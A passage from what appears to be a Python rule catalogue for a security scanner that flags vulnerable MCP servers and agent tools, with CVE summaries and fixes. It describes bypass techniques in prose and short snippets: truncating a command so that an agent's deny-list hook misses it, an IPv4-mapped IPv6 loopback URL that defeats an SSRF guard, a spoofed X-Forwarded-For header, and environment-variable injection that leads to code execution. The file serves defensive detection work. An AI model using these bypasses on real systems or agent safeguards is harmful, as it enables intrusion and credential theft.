    "`create_mobile_action_server` on TCP 8021. Neither applies inbound "
    "authentication, so an unauthenticated remote attacker who can reach either "
    "port invokes `capture_screenshot`, `get_ui_tree`, `tap`, `swipe`, "
    "`type_text`, `launch_app`, `press_key` and `click_control` against the "
    "ADB-connected Android device — disclosing screen contents and device data, "
    "and modifying device state (CVE-2026-73296, CVSS 9.4). Fixed in 3.0.8. UFO "
    "is distributed as a git checkout rather than a PyPI or npm artifact (`ufo` "
    "on npm is unjs's unrelated URL library), so this ships as a detection rule "
    "rather than a version pin.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Upgrade UFO to >= 3.0.8. Bind the mobile data-collection and mobile action "
    "MCP servers to 127.0.0.1 rather than all interfaces, and require an inbound "
    "credential on both. Do not expose an ADB-connected device's MCP control "
    "surface to any untrusted network.",
    sarif_name="UfoMobileMcpUnauthenticated",
    cve_references=["CVE-2026-73296"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "The dependency check reads requirements* files, pyproject.toml, Pipfile, "
        "poetry.lock and uv.lock, and recognises a UFO checkout only as an "
        "`https://github.com/microsoft/UFO` URL, unpinned or below 3.0.8. The same "
        "checkout installed from a Dockerfile (`RUN pip install "
        "git+https://github.com/microsoft/UFO.git`) or referenced over SSH "
        "(`git+ssh://git@github.com/microsoft/UFO.git@v3.0.2`) is not matched."
    ),
)


_r(
    "AAK-POLICY-TRUNCATION-001",
    "Deny policy evaluated on a truncated copy of the value the executor receives",
    "A hook bridge, gateway or guard cuts a candidate command, URL or path to a "
    "fixed length \"for matching\", evaluates its deny / block patterns against "
    "the cut copy, and hands the full untruncated value to whatever executes it. "
    "Everything past the cut point is invisible to the policy and visible to the "
    "executor, so a caller simply positions the dangerous part after the bound "
    "and the hard-deny list never sees it. The disclosed instance is "
    "CVE-2026-73614 (Network-AI ClaudeHookBridge < 5.15.1, CVSS 8.8): the target "
    "string is truncated to 500 characters before `denyPatterns` are evaluated "
    "while Claude Code executes the full Bash command field. That package is not "
    "pinnable — it resolves on neither npm nor PyPI and its GitHub repository "
    "404s — so this rule is written against the shape rather than the vendor, "
    "and applies to any policy code with the same asymmetry. It fires only when "
    "the untruncated source is still referenced elsewhere in the file, which is "
    "what separates a policy/executor split from ordinary display truncation.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Evaluate the policy against exactly the value the executor receives. If a "
    "length bound is needed to cap matching cost, reject over-long input outright "
    "rather than matching a prefix of it — a truncated match is a decision made "
    "on data that is not what runs. Where the check and the execution live in "
    "different components, pass one canonical value between them instead of "
    "letting each derive its own.",
    sarif_name="DenyPolicyTruncationBypass",
    cve_references=["CVE-2026-73614"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Looks for `x = y.slice(0, 500)` (or `substring`, `substr`) or `x = y[:500]` "
        "with a numeric literal of two or more digits, tested within 400 characters of "
        "a name that contains `deny` or `block` and then ends in Pattern, List, Rule, "
        "Match, Regex or `s` (`denyPatterns`, `bashDenyList`, `DENY_PATTERNS`, "
        "`blockedList`) or contains forbidden, disallow, blacklist or hard-deny, while "
        "`y` is still used untruncated. A bound held in a constant (`slice(0, "
        "MAX_MATCH_LEN)`), a slice written `y[0:500]` and a list named "
        "`deniedPatterns` are not matched."
    ),
)


_r(
    "AAK-MCP-ATLASSIAN-CVE-2026-73498-001",
    "mcp-atlassian < 0.22.0 (confluence_upload_attachment arbitrary file read)",
    "MCP Atlassian (`mcp-atlassian`), an MCP server for Confluence and Jira, "
    "before 0.22.0 passes the client-supplied `file_path` argument of "
    "`confluence_upload_attachment` straight to `open(file_path, \"rb\")` inside "
    "`_upload_attachment_direct()` in "
    "`src/mcp_atlassian/confluence/attachments.py`, without routing it through "
    "`validate_safe_path`. An authenticated MCP client can therefore read any "
    "file the server process can reach and exfiltrate it to Confluence as an "
    "attachment. Because the tool is agent-callable, untrusted content that "
    "induces an agent to call it reaches the same primitive, disclosing server "
    "environment material such as `CONFLUENCE_API_TOKEN` and other credentials "
    "(CVE-2026-73498, CVSS 7.7). Fixed in 0.22.0.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-atlassian` to >= 0.22.0 and pin it. If you vendor or reimplement "
    "the attachment path, validate the caller-supplied path against an allowed "
    "root before opening it (the fix's `validate_safe_path`), and treat any "
    "tool argument that reaches `open()` as untrusted.",
    sarif_name="McpAtlassianAttachmentPathTraversal",
    cve_references=[
        "CVE-2026-73498",
        # 2026-09-14 wave, same package and the same 0.22.0 fix release, so the
        # floor already fires on every version either affects. Recorded for
        # auditability rather than pinned again.
        # CVE-2026-73496 (HIGH 7.7): the same unconfined `file_path` in
        # jira_update_issue's attachments parameter as well as Confluence.
        # CVE-2026-73497 (MEDIUM 6.5): X-Atlassian-*-Url resolved once at
        # middleware time and again at connection time with no IP pinning, so
        # a rebinding name reaches cloud metadata.
        "CVE-2026-73496", "CVE-2026-73497",
        # 2026-09-22 wave (#774-#777). Four more advisories on the same package,
        # all fixed by ONE commit (b0417334, cross-read on OSV) shipped as
        # 0.22.0 — which is exactly this pin's floor, so every affected version
        # already fires and no floor moves. Recorded for auditability, and each
        # also against the rule whose shape it is:
        # CVE-2026-77244 (CRITICAL 10.0) AtlassianOpaqueTokenVerifier accepts a
        #   request with no verified identity and _get_fetcher falls back to the
        #   operator's global credentials.
        # CVE-2026-77254 (CRITICAL 9.1, CWE-306) the same fallback reached
        #   through streamable-http with no per-user identity at all.
        # CVE-2026-77243 (HIGH 8.8, CWE-862) ENABLED_TOOLS / TOOLSETS are
        #   applied in tools/list and not rechecked in tools/call, so a client
        #   that knows a hidden tool name invokes it anyway.
        # CVE-2026-77248 (HIGH 8.6, CWE-22 + CWE-306) upload_attachment takes an
        #   unrestricted file_path on that same unauthenticated transport — this
        #   pin's own titular shape, now unauthenticated as well.
        "CVE-2026-77244", "CVE-2026-77254", "CVE-2026-77243", "CVE-2026-77248",
        # 2026-09-22 wave, the rest of it (#781-#786, #789, #790). Eight more
        # advisories on the same package, each citing that same b0417334 commit
        # and fixed in 0.22.0, this pin's floor. Measured on the CVE-2026-73498
        # fixtures: fires at 0.21.1, silent at 0.22.0. Recorded against this pin
        # only; no shape rule is claimed without a fixture of its own.
        # CVE-2026-77255 (HIGH 8.6, CWE-22 + CWE-441) jira update_issue's
        #   attachments become local paths routed to upload_attachment unchecked.
        # CVE-2026-77262 (HIGH 8.6, CWE-22), CVE-2026-77258 (HIGH 7.7, CWE-22)
        #   and CVE-2026-77259 (HIGH 7.7, CWE-22 + CWE-552) Confluence
        #   upload_attachment opens a caller-chosen server-local file: this
        #   pin's titular shape, which its source arm reports as well.
        # CVE-2026-77242 (HIGH 7.5, CWE-367 + CWE-918) validate_url_for_ssrf
        #   checks one DNS answer and the connection resolves another.
        # CVE-2026-77246 (HIGH 7.4, CWE-200 + CWE-22 + CWE-441) a request with
        #   no Authorization identity picks the attachment host by header.
        # CVE-2026-77261 (HIGH 7.1, CWE-918) the SSRF redirect hook is missing
        #   from the basic-auth and oauth_pat fetcher sessions.
        # CVE-2026-77253 (HIGH 7.1, CWE-22) both attachment tools accept any
        #   local path.
        "CVE-2026-77255", "CVE-2026-77262", "CVE-2026-77258", "CVE-2026-77259",
        "CVE-2026-77242", "CVE-2026-77246", "CVE-2026-77261", "CVE-2026-77253",
        # 2026-09-26 wave (#811-#814). Four more, each "fixed in version 0.22.0"
        # by that same b0417334 commit. Re-measured 2026-09-27: fires at 0.21.1,
        # silent at 0.22.0. Recorded against this pin only.
        # CVE-2026-77252 (MEDIUM 6.5, CWE-284) caller-supplied projects_filter /
        #   spaces_filter replace the administrator's allowlists.
        # CVE-2026-77270, CVE-2026-77266 (MEDIUM 6.5, CWE-22) the attachment
        #   upload tools open a caller-chosen server-local path; the second
        #   accepts absolute paths and traversal outright.
        # CVE-2026-77269 (MEDIUM 6.5, CWE-22) the CVE-2026-27825 fix guarded
        #   download destinations and left upload sources unconstrained.
        "CVE-2026-77252", "CVE-2026-77270", "CVE-2026-77266", "CVE-2026-77269",
        # 2026-09-27 wave (#822, #823, #825, #830). Four more "fixed in version
        # 0.22.0", each citing the same b0417334 commit. Re-measured 2026-10-01:
        # fires at 0.21.1, silent at 0.22.0. Recorded against this pin only.
        # CVE-2026-77250 (MEDIUM 6.1, CWE-312) OAuthConfig writes a plaintext
        #   fallback token file with process-default permissions.
        # CVE-2026-77268 (MEDIUM 5.5, CWE-732) the fallback token directory and
        #   file are created without owner-only modes.
        # CVE-2026-77265 (MEDIUM 5.9, CWE-918) header-supplied Jira and
        #   Confluence URLs are validated before the client resolves the host
        #   again, so a DNS-rebinding name reaches internal addresses.
        # CVE-2026-77272 (MEDIUM 5.4, CWE-79) the OAuth callback page
        #   interpolates the `error` parameter unescaped.
        "CVE-2026-77250", "CVE-2026-77268", "CVE-2026-77265", "CVE-2026-77272",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-DATA-01"],
    limitations=(
        "Two arms. The pin reads `mcp-atlassian` in requirements*.txt at any depth "
        "and, at the project root only, in pyproject.toml, Pipfile, package.json, "
        ".mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, "
        "poetry.lock, uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock "
        "lockfiles, taking the lowest version a range allows and reporting a "
        "reference that states no version; it is not read when declared in a "
        "sub-directory manifest (`services/api/pyproject.toml`), in "
        "`.cursor/mcp.json` or `.vscode/mcp.json`, or in `pdm.lock`, and the "
        "`ghcr.io/sooperset/mcp-atlassian` image tag of an MCP config that starts it "
        "with `docker run` is not read either. The source arm reads Python files "
        "that define a `confluence_upload_attachment` or `_upload_attachment_direct` "
        "handler and open `file_path`, `filepath`, `attachment_path` or `path` in "
        "`rb` mode with no path-validation call, so a copy that opens the path under "
        "another name (`abs_path = os.path.abspath(file_path)`, then `open(abs_path, "
        "\"rb\")`) is not reported. A file over 2 MB, or a lockfile over 32 MiB, is "
        "not read."
    ),
)


_r(
    "AAK-MCP-JSHOOK-CVE-2026-49856-001",
    "@jshookmcp/jshook 0.3.1 (ICMP/traceroute tools bypass the SSRF authorization policy)",
    "`@jshookmcp/jshook`, an MCP server exposing JavaScript-analysis and "
    "security-research tools to agents, at 0.3.1 enforces its central SSRF "
    "authorization policy — which blocks private, loopback, link-local and "
    "reserved targets unless an authorization object explicitly permits private "
    "network access — only on the raw HTTP / TCP / TLS round-trip tools. The ICMP "
    "probe and traceroute tools resolve the caller's target and invoke the native "
    "ICMP / traceroute sink directly, skipping the policy. An MCP client holding "
    "an active network domain can therefore probe internal addresses even with "
    "local SSRF access disabled for every other raw network tool, yielding an "
    "internal reachability and route-mapping primitive from the server's network "
    "position (CVE-2026-49856, CVSS 4.3). Fixed in 0.3.2; GHSA-c5r6-m4mr-8q5j "
    "records 0.3.1 as the only affected release.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `@jshookmcp/jshook` to >= 0.3.2 and pin it. Route every network tool, "
    "including ICMP and traceroute, through the same SSRF authorization policy "
    "rather than gating only the raw HTTP/TCP/TLS paths.",
    sarif_name="JshookIcmpSsrfPolicyBypass",
    cve_references=["CVE-2026-49856"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `@jshookmcp/jshook` in requirements*.txt at any depth and, at the "
        "project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)


_r(
    "AAK-MCP-AUTHFETCH-CVE-2026-49857-001",
    "auth-fetch-mcp <= 3.0.1 (IPv4-mapped IPv6 loopback bypasses the SSRF guard)",
    "`auth-fetch-mcp`, an MCP server that fetches authenticated web pages for "
    "assistants, blocks private and loopback destinations in `assertSafeUrl()` "
    "(`src/security.ts`), but its `isPrivateV6()` check misses IPv4-mapped IPv6 "
    "loopback addresses in hex-normalised form. A URL such as "
    "`http://[::ffff:127.0.0.1]:PORT/` is silently normalised by the Node WHATWG "
    "URL parser to `[::ffff:7f00:1]`; because `net.isIPv4('7f00:1')` is false, the "
    "private-address check does not fire and the URL reaches the browser or HTTP "
    "client, so an MCP tool call reaches loopback services the guard exists to "
    "protect. Exploitable under the default configuration with no special "
    "environment variable (CVE-2026-49857, CVSS 7.4). GHSA-pvrj-8cg3-j5f8 records "
    "the affected range as <= 3.0.1 with 3.0.2 the first patched release — note "
    "the NVD text's claim that 3.0.1 patches the issue is contradicted by the "
    "advisory's own version data.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `auth-fetch-mcp` to >= 3.0.2 and pin it. When validating a "
    "destination, resolve the host and test the resulting address, rather than "
    "pattern-matching the textual form: normalise IPv4-mapped IPv6 "
    "(`::ffff:a.b.c.d`, including its hex form) to IPv4 before the private-range "
    "check, and re-check after any redirect.",
    sarif_name="AuthFetchMcpMappedIpv6LoopbackBypass",
    cve_references=["CVE-2026-49857"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `auth-fetch-mcp` in requirements*.txt at any depth and, at the "
        "project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)


_r(
    "AAK-MCP-MEMSERVICE-CVE-2026-50027-001",
    "mcp-memory-service < 10.67.1 (/api/documents/* served with no authentication)",
    "`mcp-memory-service`, a semantic memory layer for AI applications, before "
    "10.67.1 serves every HTTP route under `/api/documents/*` with no "
    "authentication dependency attached — even when the server is configured "
    "with an API key (`MCP_API_KEY`) or OAuth. An unauthenticated remote caller "
    "can write arbitrary content into the memory store, read stored document "
    "content back out, and permanently delete memories belonging to "
    "authenticated users. The sibling `/api/memories` routes do enforce "
    "authentication, which is what makes this an inconsistent boundary rather "
    "than a server that is simply open: an operator who checks one route "
    "reasonably concludes the surface is protected (CVE-2026-50027, CVSS 9.8). "
    "Fixed in 10.67.1; GHSA-84hp-mqvj-3p8h records the affected range as "
    "< 10.67.1.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp-memory-service` to >= 10.67.1 and pin it. Until then treat the "
    "memory store as world-writable and world-readable: do not expose the port "
    "beyond loopback, and assume any document already in it may have been read "
    "or altered. Apply the auth dependency at the router level rather than "
    "per-route, so a new route cannot ship unprotected by omission.",
    sarif_name="McpMemoryServiceUnauthDocuments",
    cve_references=["CVE-2026-50027"],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI06"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `mcp-memory-service` in requirements*.txt at any depth and, at the "
        "project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). The `doobidoo/mcp-memory-service` image tag is not read, in a "
        "compose file or in an MCP config that starts it with `docker run`. A file "
        "over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-CORTEX-CVE-2026-49986-001",
    "neuro-cortex-memory <= 3.17.0 (CLAUDE_PROJECT_DIR treated as a trusted source root)",
    "Cortex (`neuro-cortex-memory`), a cross-platform persistent-memory MCP "
    "server, at 3.17.0 and below treats the `CLAUDE_PROJECT_DIR` environment "
    "variable — which Claude Code sets automatically to whatever project is "
    "currently open — as a candidate Cortex developer checkout. When the "
    "`open_visualization` tool runs, `_find_dev_source()` resolves that "
    "directory as a source root and `_is_cortex_root()` validates it by looking "
    "for nothing more than an `mcp_server/` subdirectory and a "
    "`ui/unified-viz.html` file. An attacker who ships those two marker paths in "
    "a repository gets `mcp_server/server/visualize_bootstrap.py` from that "
    "repository executed via `subprocess.run([sys.executable, ...])`, with the "
    "victim's privileges, simply because the victim opened the repo "
    "(CVE-2026-49986, HIGH). Note the fix version: the NVD text says 3.17.1, but "
    "GHSA-gvpp-v77h-5w8g records the affected range as <= 3.17.0 with **3.18.0** "
    "first patched, and no 3.17.1 was ever published to PyPI — so 3.18.0 is the "
    "floor. The distribution was later renamed to `hypermnesia-mcp`, whose "
    "earliest release is 3.24.0 and therefore always above this floor.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `neuro-cortex-memory` to >= 3.18.0 and pin it, or move to its "
    "successor `hypermnesia-mcp` (>= 3.24.0, above the affected line). Never "
    "derive a trusted code root from an environment variable the editor points "
    "at untrusted content; marker-file presence is not authentication.",
    sarif_name="CortexClaudeProjectDirExec",
    cve_references=["CVE-2026-49986"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-RCE-04"],
    limitations=(
        "Reads `neuro-cortex-memory` in requirements*.txt at any depth and, at the "
        "project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse "
        "(`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-CKAN-CVE-2026-73846-001",
    "@aborruso/ckan-mcp-server < 0.4.112 (cache-key collision, prefix-only host check, verbose errors)",
    "`@aborruso/ckan-mcp-server`, an MCP server for querying CKAN open-data "
    "portals, before 0.4.112 carries three related defects. `canonicalizeParams` "
    "in `src/utils/cache.ts` serialises request parameters without escaping "
    "`&`, `=` or `|`, so distinct logical parameter sets collapse to the same "
    "`buildCacheKey` output and an attacker can prime the shared cache with a "
    "response another user's different query then receives (CVE-2026-73846, "
    "CVSS 6.5). `isValidMqaServer`, used by `ckan_get_mqa_quality` and "
    "`ckan_get_mqa_quality_details` in `src/tools/quality.ts`, validates the "
    "`server_url` parameter with a prefix-only regular expression for "
    "`dati.gov.it`, which suffix-host and URL-userinfo forms defeat, letting a "
    "caller point the tool at an attacker-controlled host and receive a spoofed "
    "response (CVE-2026-73845, CVSS 5.3). Error paths reflect raw upstream "
    "response bodies and internal exception text — hostnames, internal IPs, "
    "database errors, stack fragments — back to the caller instead of a "
    "sanitised message (CVE-2026-73844, CVSS 3.7). All three are fixed in "
    "0.4.112.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `@aborruso/ckan-mcp-server` to >= 0.4.112 and pin it. The three "
    "share a root cause worth fixing in any MCP server: build cache keys from a "
    "structured, escaped encoding rather than string concatenation; validate a "
    "caller-supplied host by parsing the URL and comparing the resolved host "
    "exactly, never by prefix-matching the raw string; and return a generic "
    "error to the caller while logging the detail server-side.",
    sarif_name="CkanMcpServerCacheAndHostValidation",
    cve_references=[
        "CVE-2026-73846", "CVE-2026-73845", "CVE-2026-73844", "CVE-2026-53509",
        # CVE-2026-61612 (#824, MEDIUM 5.7, CWE-918): the third bypass of the
        # `validateServerUrl` SSRF guard, which checks the hostname string and
        # never resolves it. Fixed in 0.4.108, below this pin's 0.4.112 floor.
        "CVE-2026-61612",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `@aborruso/ckan-mcp-server` in requirements*.txt at any depth and, at "
        "the project root only, in pyproject.toml, Pipfile, package.json, .mcp.json, "
        "mcp.json, claude_desktop_config.json and the Pipfile.lock, poetry.lock, "
        "uv.lock, package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking "
        "the lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`packages/app/package.json`), in `.cursor/mcp.json` or "
        "`.vscode/mcp.json`, or in a lockfile format the reader does not parse (a "
        "Yarn 2+ `yarn.lock`). A file over 2 MB, or a lockfile over 32 MiB, is not "
        "read."
    ),
)


_r(
    "AAK-MCP-LETTA-CVE-2025-51482-001",
    "Letta (MemGPT) <= 0.16.4 (four CVEs: /v1/tools/run RCE, file-URL handler, AST parser)",
    "`letta` — the agent server formerly known as MemGPT — carries four "
    "disclosed vulnerabilities across its 0.4 to 0.16 line, none of which names "
    "a fixed release in NVD:\n"
    "  - CVE-2025-51482 (HIGH): `run_tool_from_source` in "
    "`letta.server.rest_api.routers.v1.tools` lets a remote caller execute "
    "arbitrary Python and system commands through a crafted payload to the "
    "`/v1/tools/run` endpoint. Affected at 0.7.12.\n"
    "  - CVE-2026-4964: `_convert_message_create_to_message` in "
    "`letta/helpers/message_helper.py` mishandles the File URL Handler. "
    "Affected at 0.16.4.\n"
    "  - CVE-2026-4965: `resolve_type` in `letta/functions/ast_parsers.py`, "
    "explicitly recorded as an **incomplete fix** for CVE-2025-6101. Affected "
    "at 0.16.4.\n"
    "  - CVE-2025-6101: `function_message` in `letta/interface.py`, reachable "
    "through the `function_name` / `function_args` arguments. Affected up to "
    "0.4.1.\n"
    "The floor is set at 0.16.5, the first release published after the highest "
    "affected version — an inference from release ordering, not a vendor fix "
    "statement, since every one of the four CPE entries names an exact version "
    "with no `versionEndExcluding` and all four GHSA records are `unreviewed` "
    "with no curated version range. Treat it as \"past every version known to "
    "be affected\" rather than \"vendor-confirmed patched\". The pin targets the "
    "PyPI `letta` server distribution only: the vulnerable code lives in "
    "`letta/...` module paths, while `letta-client` and npm "
    "`@letta-ai/letta-client` are separate client SDKs on their own version "
    "lines, and npm `@letta-ai/letta` is a 0.0.1 placeholder.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `letta` to >= 0.16.5 and pin it. Because no vendor fix statement "
    "exists for any of the four, also treat the server as untrusted at the "
    "boundary regardless of version: do not expose `/v1/tools/run` beyond "
    "loopback, and require authentication in front of it — CVE-2025-51482 is "
    "remote code execution reachable through that endpoint. CVE-2026-4965 "
    "being an incomplete fix for CVE-2025-6101 is a reason to verify the "
    "behaviour yourself rather than rely on a version number alone.",
    sarif_name="LettaAgentServerCveChain",
    cve_references=[
        "CVE-2025-51482", "CVE-2026-4964", "CVE-2026-4965", "CVE-2025-6101",
    ],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-RCE-04"],
    incident_references=["OX-MCP-2026-05-01"],
    limitations=(
        "Reads `letta` in requirements*.txt at any depth and, at the project root "
        "only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`) or in a lockfile format the reader "
        "does not parse (`pdm.lock`). A compose file's `letta/letta` image tag is "
        "not read. A file over 2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


_r(
    "AAK-MCP-FLYTO-CVE-2026-67425-001",
    "Flyto2 Core forwards provider API keys to a caller-controlled base_url, and its HTTP MCP route runs modules unauthenticated (<2.26.6)",
    "Flyto2 Core (`flyto-core`), an MCP-native execution kernel for AI-agent "
    "workflows, before 2.26.6 has `llm.chat` read provider credentials such as "
    "`OPENAI_API_KEY` and `ANTHROPIC_API_KEY` from the environment and send them in "
    "the `Authorization: Bearer` header to a caller-controlled `base_url`. An actor "
    "who can steer `base_url` to a public host that clears the SSRF guard receives "
    "the operator's provider key (CVE-2026-67425, CVSS 8.6). Fixed in 2.26.6; treat "
    "< 2.26.6 (and unpinned) as exposed. The env-var-key exfil-to-caller-controlled-"
    "endpoint class here is adjacent to the config-side env-secret exfil surface "
    "`AAK-MCP-ENV-PLACEHOLDER-EXFIL-001` covers. CVE-2026-55786 (CVSS 8.4) sits under "
    "the same floor: from 2.26.2 to 2.26.3 the HTTP MCP route (`POST /mcp`) takes "
    "`tools/call` requests without the `require_auth` dependency the REST execution "
    "routes use, so an unauthenticated caller can run `execute_module` with "
    "`sandbox.execute_shell` and a command of its choosing. Fixed in 2.26.4.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `flyto-core` to >= 2.26.6 and pin it. Restrict `llm.chat` `base_url` to "
    "an allow-list of trusted provider hosts, and never forward environment-sourced "
    "provider keys to a caller-supplied endpoint. Until the upgrade, do not expose "
    "the HTTP API, whose `/mcp` route runs modules without authentication from "
    "2.26.2 to 2.26.3, beyond localhost.",
    sarif_name="Flyto2CoreProviderKeyExfil",
    cve_references=[
        "CVE-2026-67425",
        # 2026-10-15 batch, before the watcher filed it. GHSA-h9f9-h6gm-wc85 gives
        # `>= 2.26.2, < 2.26.4`; the fix, db7f116, adds `Depends(require_auth)` to
        # the POST handler in `core/api/routes/mcp.py`, absent in the 2.26.3 wheel.
        # Fixed below the 2.26.6 floor, which has no lower bound, so every affected
        # release already fires.
        "CVE-2026-55786",
    ],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025", "MCP05:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI03", "ASI04", "ASI05"],
    adversa_references=["ADV-AUTH-01"],
    limitations=(
        "Reads `flyto-core` in requirements*.txt at any depth and, at the project "
        "root only, in pyproject.toml, Pipfile, package.json, .mcp.json, mcp.json, "
        "claude_desktop_config.json and the Pipfile.lock, poetry.lock, uv.lock, "
        "package-lock.json, pnpm-lock.yaml and yarn.lock lockfiles, taking the "
        "lowest version a range allows and reporting a reference that states no "
        "version. The dependency is not read when it is declared in a sub-directory "
        "manifest (`services/api/pyproject.toml`) or in a lockfile format the reader "
        "does not parse (`pdm.lock`). A file over 2 MB, or a lockfile over 32 MiB, "
        "is not read."
    ),
)


_r(
    "AAK-MCP-LANGFLOW-CVE-2026-12940-001",
    "Langflow MCP stdio launcher env-var-injection RCE (1.0.0–<1.12.0)",
    "IBM Langflow OSS (`langflow`) from 1.0.0 through 1.10.1 is vulnerable to "
    "unauthenticated remote code execution through its MCP stdio launcher: the "
    "`DANGEROUS_ENV_VARS` blocklist in `src/lfx/base/mcp/util.py` omits `SHELLOPTS`, "
    "`BASHOPTS`, and `PS4`, so an unauthenticated attacker can inject those "
    "environment variables into a launched stdio MCP server process and achieve "
    "arbitrary code execution (CVE-2026-12940, CVSS 9.8). The same 1.11.0 floor "
    "also remediates five further Langflow OSS CVEs disclosed for 1.0.0–1.10.3: "
    "CVE-2026-17623 (command-field RCE in MCP server configurations), "
    "CVE-2026-17626 (host-file read/modify via unfiltered Docker volume-mount and "
    "device-mapping args), CVE-2026-8446 (MCP composer OAuth authentication "
    "bypass), CVE-2026-9077 (writing arbitrary MCP server configurations into host "
    "IDE config files), and CVE-2026-7646 (`resources/read` path traversal reading "
    "the JWT signing secret, the SQLite DB, and process env). A seventh, "
    "CVE-2026-9186, raised the floor past those: Langflow OSS 1.0.0–1.11.2 trusts "
    "a spoofed `X-Forwarded-For: 127.0.0.1` header to satisfy its localhost-only "
    "guard on MCP-config installation, so a remote authenticated attacker writes "
    "arbitrary IDE configuration files (`~/.cursor/mcp.json` and siblings) — which "
    "1.11.0, 1.11.1 and 1.11.2 are all exposed to. Three further IBM advisories "
    "then moved the floor again, all scoped 1.0.0 through 1.11.5: CVE-2026-85025 "
    "(CRITICAL 9.8) — unauthenticated arbitrary code execution and access to other "
    "users\' chat sessions through publicly shared MCP project endpoints, because "
    "public-flow security restrictions and session isolation are both enforced "
    "improperly; CVE-2026-78575 (HIGH 8.8) — a remote authenticated attacker "
    "executes arbitrary commands through improperly validated command-line "
    "arguments in the MCP stdio server configuration; and CVE-2026-81941 "
    "(HIGH 8.8) — a non-administrative authenticated user runs OS commands at the "
    "application\'s privilege level by building a flow whose MCP Tools component "
    "uses a local stdio subprocess transport, bypassing both "
    "`LANGFLOW_CUSTOM_COMPONENT_ADMIN_ONLY` and "
    "`LANGFLOW_BLOCK_CODE_INTERPRETER_COMPONENTS`. Those are fixed in 1.11.6. "
    "CVE-2026-101861 (CVSS 4.1) then moved the floor to 1.12.0: from 1.0.16 through "
    "1.11.6, an authenticated caller's Tool-Mode input options reach `eval()` in "
